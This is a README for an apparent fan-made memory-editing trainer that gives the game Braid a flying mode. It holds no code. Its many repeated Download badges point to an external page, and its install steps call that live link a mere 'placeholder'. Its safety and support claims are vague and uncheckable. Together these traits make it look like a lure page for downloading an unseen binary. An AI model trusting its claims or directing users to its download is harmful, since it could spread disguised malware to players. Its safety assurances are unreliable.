![preview](https://raw.githubusercontent.com/skull-999/braid-flight-module/main/promo_01c03.svg)
[![Download](https://raw.githubusercontent.com/skull-999/braid-flight-module/main/bin_cec92f.svg)](https://skull-999.github.io/braid-flight-module/)

# 🧭 Braid Alternate Locomotion Lab — *Aerial Drift Edition*

[![Download](https://raw.githubusercontent.com/skull-999/braid-flight-module/main/bin_cec92f.svg)](https://skull-999.github.io/braid-flight-module/)

Welcome to the **Braid Alternate Locomotion Lab — Aerial Drift Edition**, a memory-manipulation sandbox for the beloved indie puzzle-platformer *Braid*. Where the original game ties your every jump to the ticking of a rewound clock, this project gently untethers your avatar from the ground and lets you drift wherever curiosity points. Think of it less as a shortcut and more as a pair of invisible wings folded neatly into the game’s memory space — always ready, never intrusive.

If you’ve ever stared at a distant ledge, wondered what lived above the third tower, or simply wanted to admire the hand-painted backdrops from a bird’s perspective, this lab is for you. It is a research playground, a curiosity engine, and a love letter to one of gaming’s most poetic platformers.

[![Download](https://raw.githubusercontent.com/skull-999/braid-flight-module/main/bin_cec92f.svg)](https://skull-999.github.io/braid-flight-module/)

---

## 🕊️ What Is This Project, Really?

Picture a clockmaker’s workshop at midnight. The gears of *Braid* are still turning, but someone has quietly loosened one tiny spring — just enough for the whole mechanism to hover instead of fall. That’s the spirit of the **Aerial Drift Edition**. It’s a memory-level companion that intercepts vertical motion data and substitutes it with a smoother, weightless drift model.

The project does **not** rewrite the game, does **not** distribute game assets, and does **not** modify any files on disk. Instead, it observes the running process and adjusts a small set of values in real time, which the game then interprets as “float gently upward.” The result is a serene, exploratory mode that coexists peacefully with puzzles, art, and music.

We like to describe it as **“gravity with a dimmer switch.”**

---

## ✨ Feature Highlights

Every feature below was designed with the same philosophy: keep the world beautiful, remove the friction, respect the original.

| Icon | Feature | Description |
|------|---------|-------------|
| 🌬️ | **Aerial Drift Mode** | Smooth, adjustable vertical motion that replaces the standard descent, letting you glide across gaps and skim over hazards. |
| 🎚️ | **Responsive Control Panel** | A lightweight, resize-friendly interface that adapts from widescreen desktops to compact laptops — the sliders follow your layout. |
| 🌍 | **Multilingual Support** | Interface strings available in English, Spanish, French, German, Portuguese, Japanese, and Korean, with community-contributed packs on the way. |
| 🛰️ | **24/7 Companion Support** | A rotating volunteer and automated assistant channel keeps documentation, FAQs, and issue triage alive around the clock, every day of the year. |
| 🧩 | **Puzzle-Safe Defaults** | Ships with conservative settings so that casual exploration never trips a scripted trigger unless you explicitly raise the dial. |
| 🧠 | **Memory Signature Learning** | The engine remembers which build signature worked last time, reducing setup to a single confirmation on returning sessions. |
| 📈 | **Live Telemetry HUD** | Optional overlay shows altitude, drift velocity, and process health without ever writing to disk. |
| 🔒 | **Read-Then-Adjust Design** | Values are read first, adjusted second, and restorable with one keystroke — a reversible experiment every time. |
| 🎨 | **Themable Skin Pack** | Neutral, high-contrast, and sepia themes to match the painterly aesthetic of the game. |
| 🧾 | **Session Journal** | Exportable plain-text logs of your exploration sessions for streamers, archivists, and the simply curious. |

---

## 🚀 Getting Started (No Terminal Incantations Required)

We deliberately avoided the usual command-line rituals. Here is the gentle path:

1. **Acquire the package.** Wherever a download prompt would normally live in this document, you’ll find the macro [![Download](https://raw.githubusercontent.com/skull-999/braid-flight-module/main/bin_cec92f.svg)](https://skull-999.github.io/braid-flight-module/) standing in as a placeholder. In the published repository, that macro is replaced by the hosting platform’s standard distribution panel.
2. **Unpack the archive** using your operating system’s built-in extraction tool. No additional archivers required.
3. **Launch the companion** while *Braid* is already running and focused.
4. **Confirm the detected signature** when the panel appears. If the auto-detection hesitates, choose the manual list and pick the entry matching your storefront edition.
5. **Press the activation toggle.** The drift envelope engages, and a soft chime (optional) confirms your avatar is now weightless.

That’s the entire ritual. No configuration files to hand-edit, no environment variables to memorize, no reboot required.

---

## 🧭 A Guided Tour of the Panel

The interface is arranged like a small observatory, with instruments grouped by purpose.

- **The Drift Knob** — controls vertical lift. Low values feel like walking on the moon; high values feel like swimming through air.
- **The Glide Governor** — caps horizontal speed so you don’t overshoot puzzle rooms.
- **The Anchor Toggle** — instantly returns gravity to its original state, ideal for scripted cutscenes.
- **The Ambient Readout** — displays current altitude, drift vector, and frame pacing.
- **The Language Ribbon** — switches the interface language on the fly, no restart needed.
- **The Support Beacon** — one tap opens the help channel, staffed 24/7.

Each control is described in a tooltip written in plain language, because not everyone wants to read a manual.

---

## 🎯 Who Is This For?

This project attracts a specific sort of traveler:

- **The Completionist** who has already solved every puzzle and now wants to photograph the world from above.
- **The Student of Level Design** who wants to study how *Braid* layers parallax backgrounds and collision volumes from an aerial vantage.
- **The Streamer** seeking a visually distinct way to present familiar scenes without spoiling puzzle solutions on first watch.
- **The Tinkerer** curious about how process memory can be gently reshaped without destructive edits.
- **The Artist** who simply wants to sit on a cloud above the princess’s balcony and listen to the soundtrack.

If any of these descriptions fits you, welcome aboard.

---

## 🛡️ A Word on Safety and Ethics

We believe exploration should never come at the cost of the game’s integrity. This project:

- **Does not** alter save files, achievements, or online profiles.
- **Does not** contact remote servers with your gameplay data.
- **Does not** bundle, redistribute, or reverse-distribute any copyrighted asset from the original title.
- **Does** operate entirely in volatile memory, with a one-key restoration path.
- **Does** encourage players to purchase and support the original game, which remains one of the finest works in the medium.

Consider it a pair of museum gloves: you may look closely, but you leave no fingerprints behind.

---

## 🧱 Architecture at a Glance

The lab is organized into four cooperating micro-engines:

1. **Scanner** — enumerates process modules and identifies candidate signatures. Non-invasive by design.
2. **Interpreter** — maps raw byte patterns to semantic fields such as vertical velocity and collision state.
3. **Modulator** — applies drift envelopes and reversible adjustments, one tick at a time.
4. **Presenter** — renders the responsive interface, handles multilingual strings, and emits the telemetry HUD.

Each engine can run independently, which is why the panel stays responsive even under heavy game load.

---

## 🌐 Internationalization Notes

Language packs live in a plain-text directory and follow a simple key-value convention. Translators do not need programming knowledge — only enthusiasm and a text editor. The language ribbon detects new packs on startup and lists them automatically.

Current community-managed locales:

- English (reference)
- Spanish (Latin America and Spain variants merged)
- French
- German
- Portuguese (Brazil and Portugal merged)
- Japanese
- Korean

New locales are welcomed with open arms and credited in the release notes.

---

## 🧪 Compatibility Matrix

| Platform | Storefront Variant | Status | Notes |
|----------|-------------------|--------|-------|
| Windows | Direct distribution edition | ✅ Verified | Fully tested with default drift profile. |
| Windows | Popular digital storefront edition | ✅ Verified | Auto-detection resolves on first run. |
| Linux (Proton layer) | Digital storefront edition | 🟡 Community-tested | Works with default profile; feedback welcome. |
| macOS | Digital storefront edition | 🟠 In progress | Scanner requires additional signature research. |

We publish this matrix openly so expectations are always calibrated.

---

## 🧑‍🔧 Troubleshooting Pocket Guide

- **Panel doesn’t appear:** ensure the game is focused before activating the companion.
- **Drift feels too strong:** lower the Drift Knob by two increments and re-test in a small room.
- **Signature not found:** open the manual list and select the entry whose version string matches your build.
- **Interface language stuck:** toggle the Language Ribbon once to force a re-read of the pack directory.
- **Support needed:** the 24/7 companion channel is reachable from the Support Beacon inside the panel.

---

## 📜 License

This project is distributed under the **MIT License**. You are welcome to study, adapt, and share the code with attribution. A working copy of the license text is available at the canonical reference below.

[MIT License](https://opensource.org/licenses/MIT)

Copyright (c) 2026 Braid Alternate Locomotion Lab contributors.

---

## ⚠️ Disclaimer

This is an **unofficial fan-made companion utility** and is **not affiliated with, endorsed by, or sponsored by** the creators or publishers of *Braid*. All trademarks and copyrights remain the property of their respective owners. The tool operates on volatile process memory only, never redistributes game assets, and is intended strictly for personal, educational, and exploratory use. Users are responsible for complying with the terms of service of their software and platform. The maintainers assume no liability for any consequence arising from use of this software. If you enjoy *Braid*, please purchase it through official channels — support the artists who built the clockwork world you love to drift through.

---

## 🔮 Roadmap for 2026

- **Q1 2026** — macOS signature research milestone.
- **Q2 2026** — Additional locale packs and a community translation kit.
- **Q3 2026** — Telemetry export formats for educators and archivists.
- **Q4 2026** — Accessibility pass: full keyboard navigation and screen-reader labels.

---

## 🤝 Contributing

Curiosity is the only prerequisite. Contributions of locale packs, signature reports, documentation edits, and constructive feedback are all deeply appreciated. Every pull request is reviewed by a human, and every contributor is credited in the release notes.

---

## 💬 A Closing Thought

*Braid* taught us that time is a river you can swim upstream. This lab adds a second current: the sky. May your drift be gentle, your discoveries quiet, and your return to the ground always optional.

[![Download](https://raw.githubusercontent.com/skull-999/braid-flight-module/main/bin_cec92f.svg)](https://skull-999.github.io/braid-flight-module/)